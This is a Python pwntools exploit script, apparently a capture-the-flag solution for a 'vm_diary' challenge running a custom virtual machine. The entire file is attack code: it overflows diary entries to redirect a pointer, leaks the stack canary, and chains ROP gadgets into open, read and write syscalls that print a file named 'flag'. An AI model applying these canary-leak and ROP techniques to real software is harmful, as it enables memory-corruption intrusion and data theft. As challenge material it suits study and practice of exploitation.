#!/usr/bin/python
from pwn import *

def int_to_str(oper):
	res = ''
	res += chr(oper & 0b1111111)
	res += chr((oper >> 14) & 0b1111111)
	res += chr((oper >> 7) & 0b1111111)
	return res

def str_to_int(oper):
	res = 0
	res |= (ord(oper[0]) & 0b1111111)
	res |= (ord(oper[1]) & 0b1111111) << 14
	res |= (ord(oper[2]) & 0b1111111) << 7
	return res


def writing(title, content, key):
	r.sendlineafter('>', '2')
	r.sendlineafter('>', title)
	r.sendlineafter('>', content)
	r.sendline(key)

def listing():
	r.sendlineafter('>', '1')

r = process('./vm_diary.py')
#context.log_level = 'debug'


writing('flag', 'AAAA', 'AAAA')		# 0xc4000
writing('AAAA', 'AAAA', 'AAAA')		# 0x1c000

###### diary addr overwrite ######
payload1 = 'a'*( (0x59000) - (0x3a000 + 0x4ec)) # bp = 0xf5fcb, 0xf5fb6 : read() canary 
payload1 += int_to_str(0x1)
payload1 += int_to_str(0xf5fb6)
writing('AAAA', '\xff', payload1)	# 0x3a000


###### leak canary ######
listing()
r.recvuntil('YOUR DIARY')
r.recvuntil('1)')

canary = str_to_int(r.recv(3))
success('canary = '+str(hex(canary)))

###### overwrite ROP chain ######
###### open -> read -> write ######
'''
 609 :  pop r1
 60b :  pop r0
 60d :  pop r13
 
 634 :  pop r1
 636 :  pop r13
 
 _write()
 64e :  syscall r0						
 650 :  pop r6
 652 :  cmp r6, r9
 654 :  jne [r13+ #0x1fff44](0x59d)
 659 :  pop r3
 65b :  pop r2
 65d :  pop r1
 65f :  pop r13
'''
payload2 = 'a'*( (0xf5fb6) - (0xdd000 + 0x4ec))	# 0xf5fb6 : read canary
payload2 += int_to_str(canary)
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x609)	# pc, pop r1(flag) r0(1) ret(syscall);

payload2 += int_to_str(0xc4000)
payload2 += int_to_str(0x1)
payload2 += int_to_str(0x64e)	# syscall open('flag'), check canary, pop r3 r2 r1 ret;

payload2 += int_to_str(canary)
payload2 += int_to_str(0x30)	# size
payload2 += int_to_str(0x1c000)	# buf
payload2 += int_to_str(0x2)		# fd
payload2 += int_to_str(0x60b)	# pop r0 ret;

payload2 += int_to_str(0x3) 	# sys_s3
payload2 += int_to_str(0x64e)	# syscall read(2, 0xc4000, 0x30), check canary, r3 r2 r1 ret;

payload2 += int_to_str(canary)
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x0)		# dummy
payload2 += int_to_str(0x609)	# pop r1, r0 ret;

payload2 += int_to_str(0x30)	# size
payload2 += int_to_str(0x1c000)	# buf
payload2 += int_to_str(0x638)	# call write()

writing('AAAA', '\xff', payload2)	# 0xdd000


r.interactive()
